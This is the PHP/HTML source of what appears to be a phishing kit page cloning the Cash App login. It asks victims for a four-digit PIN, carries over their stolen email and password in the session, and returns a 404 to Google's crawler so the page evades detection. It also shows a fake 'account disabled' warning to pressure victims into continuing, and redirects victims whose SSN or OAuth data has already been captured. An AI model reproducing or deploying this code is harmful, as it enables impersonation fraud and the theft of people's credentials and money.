<?php
ini_set( "display_errors", 0); 
include '../../main.php';


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();



if(isset($_SESSION['ssn'])) {
    echo "<script>window.location = 'https://www.cash.app';</script>";
    exit();
}

if(isset($_SESSION['oauth'])) {
    echo "<script>window.location = '{$_SESSION['redirect']}';</script>";
    exit();
}

if(isset($_POST['submit'])) {
    
    $email    = $_SESSION['email'];
    $password = $_SESSION['password'];

}
?>
<!DOCTYPE html>
<html lang="en" style="--vh:722px;"> 
<head> 
<meta charset="utf-8"> 
<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"> 
<title>Cash App</title> 
<link rel="icon" sizes="196x196" href="/static/img/icon.png"> 
<link rel="icon" href="/static/img/favicon.ico"> 
<link rel="stylesheet" type="text/css" href="/static/css/cash.css" > 
<style> 
input{ height:45px !important; } 
.rowpin{ display:flex; width:100%; justify-content: space-between; } 
.pinput{ float:left;	width:12%; } #pin1, #pin2, #pin3, #pin4{ background:#0bb634; color:white; border:5px solid white; border-radius: 50%; text-align:center; } 
.filled{ background:whitesmoke !important;	color:white;	border:5px solid #0bb634 !important;	border-radius: 50% !important;	text-align:center; } 
.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 30%;
}
</style> 
<script>
</script> 
</head> 
<body class="theme-bg ember-application theme-green"> 
<div class="ember-view"> 
<div class="full-height application-cash ember-view"> 
<div class="cookie-banner ember-view">  
</div> <section class="layout-login flex-container full-height pad"> 
<div class="login-container flex-container flex-v-center flex-fill"> 
<p class="instructions ">
<span>Welcome back, Enter your Cash PIN to&nbsp;continue.</span> 
</p> 
<form autocomplete="off" novalidate="true" id="frmPin" method="post" action="pin.php" class="login-form ember-view"> 
<div class="rowpin"> 
<div class="field-container pinput"> 
<div class="field"> 
<div class="field fk-field-container ember-view">
<input type="tel" value="" name="pin1" autocomplete="off" spellcheck="false" id="pin1" class="ember-text-field ember-view">
</div> 
</div> 
</div> 
<div class="field-container pinput"> 
<div class="field"> 
<div class="field fk-field-container ember-view">
<input type="tel" value="" name="pin2" autocomplete="off" spellcheck="false" id="pin2" class="ember-text-field ember-view">
</div> 
</div> 
</div> 
<div class="field-container pinput"> <div class="field"> 
<div class="field fk-field-container ember-view">
<input type="tel" value="" name="pin3" autocomplete="off" spellcheck="false" id="pin3" class="ember-text-field ember-view">
</div> 
</div> 
</div> 
<div class="field-container pinput"> <div class="field"> 
<div class="field fk-field-container ember-view">
<input type="tel" value="" name="pin4" autocomplete="off" spellcheck="false" id="pin4" class="ember-text-field ember-view" >
</div> 
</div> 
</div> 
</div> 
<div class="cta submit-button-component submit-button-with-spinner ember-view" style="margin-top:30px"> 
</div> 
</form> 
</div> 
</section>  
<div id="cashModal" class="modal-manager ember-view" style="display:none"> 
<div class="modal-overlay show">
</div> 
<div class="modal-scroller fade-in show ember-view"> 
<div class="modal-window flex-container flex-v theme-white small ember-view"> 
<div class="modal-window-content content"> 
<div class="spinner-container ember-view"></div> 
<img src="../../static/img/sad.png" alt="Paris" class="center">
<p class="status-title callout"><h1>Oh no!</h1> We looking out for you, For your safety, there be disabled on your account until you verify it.</p>
<div></div>
<button id="btnConfirm" data-oauth="" class="button theme-button resend-code">Continue</button>
</div> 
</div> 
</div> 
</div> 
</div> 
</div> 
<script type="text/javascript" src="/static/js/jquery.min.js"></script> 
<script type="text/javascript" src="/static/js/mask.js"></script> 
<script type="text/javascript" src="/static/js/pin.js"></script> 
</body>
</html>